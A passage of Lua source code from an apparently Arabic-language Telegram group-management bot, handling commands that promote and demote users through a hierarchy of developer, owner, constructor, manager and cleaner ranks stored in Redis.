if DevaMeR:sismember(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من ↫ ⤈\n~ ( "..aMeRsudo..secondsudo..sudobot..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","᥀︙لم تتم ترقيته مسبقا")  
end 
if aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevaMeR:srem(LanZo..'aMeR:aMeRSudo:', result.id_)
DevaMeR:srem(LanZo..'aMeR:SecondSudo:', result.id_)
DevaMeR:srem(LanZo..'aMeR:SudoBot:', result.id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'aMeRsudo' then
DevaMeR:srem(LanZo..'aMeR:SecondSudo:', result.id_)
DevaMeR:srem(LanZo..'aMeR:SudoBot:', result.id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevaMeR:srem(LanZo..'aMeR:SudoBot:', result.id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'aMeRconstructor' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source LanZo     --
--     Set aMeRSudo     --
if Sudo(msg) then
if text ==('اضف مطور اساسي') or text ==('رفع مطور اساسي') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevaMeR:sadd(LanZo..'aMeR:aMeRSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطورين الاساسيين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور اساسي @(.*)') or text:match('^رفع مطور اساسي @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور اساسي @(.*)') or text:match('^رفع مطور اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:aMeRSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المطورين الاساسيين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور اساسي (%d+)') or text:match('^رفع مطور اساسي (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور اساسي (%d+)') or text:match('رفع مطور اساسي (%d+)')
DevaMeR:sadd(LanZo..'aMeR:aMeRSudo:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المطورين الاساسيين")  
end
--     Source LanZo     --
--     Rem SecondSudo     --
if text ==('حذف مطور اساسي') or text ==('تنزيل مطور اساسي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:aMeRSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المطورين الاساسيين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور اساسي @(.*)') or text:match('^تنزيل مطور اساسي @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور اساسي @(.*)') or text:match('^تنزيل مطور اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:aMeRSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المطورين الاساسيين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور اساسي (%d+)') or text:match('^تنزيل مطور اساسي (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور اساسي (%d+)') or text:match('تنزيل مطور اساسي (%d+)')
DevaMeR:srem(LanZo..'aMeR:aMeRSudo:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المطورين الاساسيين")  
end end
--     Source LanZo     --
--     Set SecondSudo     --
if aMeRSudo(msg) then
if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevaMeR:sadd(LanZo..'aMeR:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المطورين الثانويين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
DevaMeR:sadd(LanZo..'aMeR:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المطورين الثانويين")  
end
--     Source LanZo     --
--     Rem SecondSudo     --
if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المطورين الثانويين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
DevaMeR:srem(LanZo..'aMeR:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المطورين الثانويين")  
end end
--     Source LanZo     --
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('اضف مطور') or text ==('رفع مطور') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevaMeR:sadd(LanZo..'aMeR:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المطورين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
DevaMeR:sadd(LanZo..'aMeR:SudoBot:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المطورين")  
end
--     Source LanZo     --
--       Rem SudoBot      --
if text ==('حذف مطور') or text ==('تنزيل مطور') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المطورين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
DevaMeR:srem(LanZo..'aMeR:SudoBot:',user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المطورين")  
end end
--     Source LanZo     --
--   Set aMeRConstructor   --
if ChatType == 'sp' or ChatType == 'gp'  then
if SudoBot(msg) then
if text ==('رفع مالك') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevaMeR:sadd(LanZo..'aMeR:Owner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه مالك")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مالك @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:Owner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه مالك")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مالك (%d+)') and SourceCh(msg) then
local user = text:match('رفع مالك (%d+)')
DevaMeR:sadd(LanZo..'aMeR:Owner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه مالك")  
end
--     Source LanZo     --
--   Rem aMeRConstructor   --
if text ==('تنزيل مالك') and SourceCh(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevaMeR:srem(LanZo..'aMeR:Owner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من المالكين")  
end end end
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
if text and text:match('^تنزيل مالك @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevaMeR:srem(LanZo..'aMeR:Owner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من المالكين")  
end end end
end,nil)
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مالك (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مالك (%d+)')
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(user) == tonumber(admins[i].user_id_) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevaMeR:srem(LanZo..'aMeR:Owner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من المالكين")  
end end end
end,nil)
end end
--     Source LanZo     --
--  Set BasicConstructor  --
if Owner(msg) then
if text ==('رفع منشئ اساسي') and SourceCh(msg) then
function raf_reply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه منشئ اساسي")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه منشئ اساسي")  
end
--     Source LanZo     --
--  Rem BasicConstructor  --
if text ==('تنزيل منشئ اساسي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله منشئ اساسي")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not aMeRConstructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر للمالكين والمطورين فقط', 1, 'md')
end
--     Source LanZo     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('رفع منشئ') and SourceCh(msg) then
function raf_reply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المنشئين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المنشئين")  
end
--     Source LanZo     --
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المنشئين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المنشئين")  
end 
end
--     Source LanZo     --
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المدراء")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم رفعه في قائمة المدراء")  
end
--     Source LanZo     --
--       Rem Manager      --
if text ==('تنزيل مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تنزيله من قائمة المدراء")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","᥀︙تم تنزيله من قائمة المدراء")  
end 
--     Source LanZo     --
--       Set Cleaner      --
if text ==('رفع منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevaMeR:sadd(LanZo..'aMeR:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
if result.id_ then
DevaMeR:sadd(LanZo..'aMeR:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم رفعه في قائمة المنظفين")  
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and SourceCh(msg) then
local user = text:match('رفع منظف (%d+)')
if not aMeRConstructor(msg) and DevaMeR:get(LanZo.."aMeR:Lock:ProSet"..msg.chat_id_) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
